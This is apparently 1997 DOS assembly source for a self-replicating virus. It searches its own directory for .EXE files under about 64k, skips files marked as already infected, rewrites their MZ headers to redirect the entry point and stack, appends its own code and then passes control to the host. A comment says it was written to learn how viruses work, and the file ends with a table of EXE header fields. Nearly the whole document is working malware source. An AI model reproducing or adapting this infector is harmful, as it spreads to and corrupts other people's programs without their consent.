;
; Source code for a simple virus. This virus only attaches itself to EXE's
; less than 64k in size. It only replicates to files in the same directory 
; as itself. This code was created to find out how viruses work. It is not
; intended to be used for destructive purposes.
; This code does NOT have a good effect on Windows programs.
;
; This code completed: 27/03/97
; Version 1.0
;
; Created with Turbo Assembler:
;   tasm virus01.asm /z /p /m3
;   tlink virus01.obj /3
;
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
.MODEL TINY                             
.STACK 256                              
.386                                    
;
Code    SEGMENT 'CODE' USE16
        ASSUME cs:Code,ds:Code,es:Code  
;
ProgStart:
        mov  sp,offset NewCode          
        jmp  Beginning                  
ExitProg:
        mov  ax,4C00h                   
        int  21h                        
;
; * * * * * * * * * * * * *
NewCode LABEL BYTE                      
;                                       
oIDword equ (offset IDword)-(offset NewCode)
oNewName equ (offset NewName)-(offset NewCode)
oNewHandle equ (offset NewHandle)-(offset NewCode)
oNewSize equ (offset NewSize)-(offset NewCode)
oNewHdrSize equ (offset NewHdrSize)-(offset NewCode)
oNewIPpos equ (offset NewIPpos)-(offset NewCode)
oNewLastPage equ (offset NewLastPage)-(offset NewCode)
oNewFileSize equ (offset NewFileSize)-(offset NewCode)
oOldIPpos equ (offset OldIPpos)-(offset NewCode)
oOldSP equ (offset OldSP)-(offset NewCode)
oBuffer equ (offset Buffer)-(offset NewCode)
oCtr equ (offset Ctr)-(offset NewCode)
oEndCtr equ (offset EndCtr)-(offset NewCode)
oDTA equ (offset DTA)-(offset NewCode)
oBeginning equ (offset Beginning)-(offset NewCode)
oEndCode equ (offset EndCode)-(offset NewCode)
;
IDword db 'PL'                          
NewName db '*.EXE',13 dup(0)            
NewHandle dw 0                          
NewSize dd 0                            
NewHdrSize dw 0                         
NewIPpos dw 0                           
NewLastPage dw 0                        
NewFileSize dw 0                        
OldIPpos dw offset ExitProg             
OldSP dw 256                            
Buffer dw 0                             
Ctr dw 0                                
EndCtr dw 0                             
DTA db 42 dup(0)                        
;
Beginning:                              
        mov  ax,cs                      
        mov  ds,ax                      
        mov  di,sp                      
        mov  ax,[di+oOldSP]             
        mov  es,ax                      
        mov  ax,[di+oOldIPpos]          
        mov  fs,ax
;
; Search for a new file
;
            mov  ah,1Ah                 
            mov  dx,di                  
            add  dx,oDTA                
            int  21h                    
        jc   Error                      
            mov  ah,4Eh                 
            mov  al,00h                 
            mov  cx,0                   
            mov  dx,di                  
            add  dx,oNewName            
            int  21h
        jc   Error                      
;
; Open the File
;
            mov  dx,di                  
            add  dx,oDTA+1Eh            
            mov  ax,3D02h
            int  21h
        jc   SearchLoop                 
        mov  [di+oNewHandle],ax         
;
; Get & calc the actual file size
;
        xor  eax,eax                    
        xor  esi,esi
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,2                   
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer             
            mov  cx,2                   
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,[di+oBuffer]            
        mov  [di+oNewLastPage],ax
        mov  gs,ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di                  
            add  dx,oBuffer             
            mov  cx,2                   
            mov  ah,3Fh                 
            int  21h                    
        jc   SearchLoop                 
        mov  si,[di+oBuffer]
        mov  [di+oNewFileSize],si
        mov  bx,gs                      
        shl  esi,9                      
        mov  ax,512                     
        sub  ax,bx                      
        sub  esi,eax                    
        mov  [di+oNewSize],esi
;
; If the file is too large then search for another file
;
        mov  eax,[di+oNewSize]          
        cmp  eax,65535-1024             
        jg   SearchLoop
;
; If prog already in file then search for another file
;
            mov  bx,[di+oNewHandle]     
            mov  cx,0                   
            mov  dx,[di+oNewSize]       
            sub  dx,10
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,[di+oBuffer]
        cmp  ah,'X'                     
        je   SearchLoop                 
        cmp  al,'X'                     
        je   SearchLoop
;
; file available
;
        and  ax,ax                      
        jz   Continue                   
;
; Main Search loop
;
    SearchLoop:
            mov  ah,4Fh                 
            int  21h                    
        jc   Error                      
;
; Open the File                         
;
            mov  dx,di                  
            add  dx,oDTA+1Eh
            mov  ax,3D02h
            int  21h
        jc   SearchLoop
        mov  [di+oNewHandle],ax         
;
; Get & calc the actual file size
;
        xor  eax,eax
        xor  esi,esi
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,2
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,[di+oBuffer]            
        mov  [di+oNewLastPage],ax
        mov  gs,ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  si,[di+oBuffer]
        mov  [di+oNewFileSize],si
        mov  bx,gs
        shl  esi,9
        mov  ax,512
        sub  ax,bx
        sub  esi,eax
        mov  [di+oNewSize],esi
;
; If the file is too large then search for another file
;
        mov  eax,[di+oNewSize]
        cmp  eax,65535-1024
        jg   SearchLoop
;
; If prog already in file then search for another file
;
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,[di+oNewSize]
            sub  dx,10
            mov  ax,4200h
            int  21h
        jc   SearchLoop
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   SearchLoop
        mov  ax,[di+oBuffer]
        cmp  ah,'X'
        je   SearchLoop
        cmp  al,'X'
        je   SearchLoop
;
; If got this far then file available
;
    Continue:                           
;
; Increase load module size in Header
;
        mov  ax,[di+oNewFileSize]       
        add  ax,2 ;inc  ax              
        mov  [di+oBuffer],ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,4
            mov  ax,4200h
            int  21h
        jc   Error                      
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer             
            mov  cx,2                   
            mov  ah,40h
            int  21h
        jc   Error
;
; Get the Header Size
;
            mov  bx,[di+oNewHandle]     
            mov  cx,0                   
            mov  dx,8                   
            mov  ax,4200h
            int  21h
        jc   Error
            mov  bx,[di+oNewHandle]     
            mov  dx,di                  
            add  dx,oBuffer             
            mov  cx,2                   
            mov  ah,3Fh                 
            int  21h
        jc   Error
        mov  ax,[di+oBuffer]
        shl  ax,4
        mov  [di+oNewHdrSize],ax
;
; Get the file's IP
;
            mov  bx,[di+oNewHandle]     
            mov  cx,0                   
            mov  dx,14h
            mov  ax,4200h
            int  21h
        jc   Error
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,3Fh
            int  21h
        jc   Error
        mov  ax,[di+oBuffer]
        mov  [di+oNewIPpos],ax
;
; Set the new IP
;
        mov  ax,[di+oNewSize]           
        sub  ax,[di+oNewHdrSize]        
        add  ax,oBeginning              
        mov  [di+oBuffer],ax
            mov  [di+oBuffer],ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0                   
            mov  dx,14h                 
            mov  ax,4200h               
            int  21h
        jc   Error                      
            mov  bx,[di+oNewHandle]
            mov  dx,di                  
            add  dx,oBuffer
            mov  cx,2                   
            mov  ah,40h
            int  21h
        jc   Error
        mov  ax,[di+oNewIPpos]          
        mov  [di+oOldIPpos],ax          
;                                       
; Get old Stack Pointer
;
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,10h                 
            mov  ax,4200h               
            int  21h
        jc   Error
            mov  bx,[di+oNewHandle]     
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2                   
            mov  ah,3Fh
            int  21h
        jc   Error
        mov  ax,[di+oBuffer]
        mov  [di+oOldSP],ax
;
; Set new Stack Pointer
;
        mov  ax,[di+oNewSize]           
        sub  ax,[di+oNewHdrSize]
        mov  [di+oBuffer],ax
            mov  [di+oBuffer],ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,10h
            mov  ax,4200h
            int  21h
        jc   Error                      
            mov  bx,[di+oNewHandle]
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,40h
            int  21h
        jc   Error
;
; Replicate Code
;
        mov  ax,[di+oNewSize]
        mov  [di+oCtr],ax               
        mov  ax,di                      
        add  ax,oEndCode
        mov  [di+oEndCtr],ax
        mov  si,di
    WriteLoop:
        mov  ax,[si]
        mov  [di+oBuffer],ax
            mov  bx,[di+oNewHandle]     
            mov  cx,0
            mov  dx,[di+oCtr]
            mov  ax,4200h               
            int  21h
        jc   Error
            mov  bx,[di+oNewHandle]
            mov  dx,di
            add  dx,oBuffer
            mov  cx,2
            mov  ah,40h
            int  21h
        jc   Error
        mov  ax,2
        add  [di+oCtr],ax
        add  si,ax
        cmp  si,[di+oEndCtr]
        jb   WriteLoop
;
; Close the file
;
            mov  bx,[di+oNewHandle]     
            mov  ah,3Eh                 
            int  21h
        jc   Error
;
; If error or end of prog jump to here
;
Error:
        mov  ax,es                      
        mov  [di+oOldSP],ax
        mov  sp,[di+oOldSP]
        mov  di,fs
        jmp  di                         
;
EndIDword db 134 dup('X')               
;
EndCode LABEL BYTE
; * * * * * * * * * * * * *
;
Code    ENDS
;
END ProgStart
;
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; EXE header:
;
; Hex Offset    Contents       
; ----------    --------
;   00-01       4Dh,4Ah (MZ)
;   02-03       bytes in last page
;   04-05       file size in 512 byte pages
;   06-07       num relocation entries
;   08-09       header size in paras
;   0A-0B       min paras required above end of program
;   0C-0D       max paras required above end of program
;   0E-0F       initial stack seg before relocation
;   10-11       initial stack pointer value
;   12-13       neg sum of words in file
;   14-15       initial instruction pointer value
;   16-17       initial code seg before relocation
;   18-19       relative offset from beginning of run file to relocation table
;   1A-1B       overlay number
;
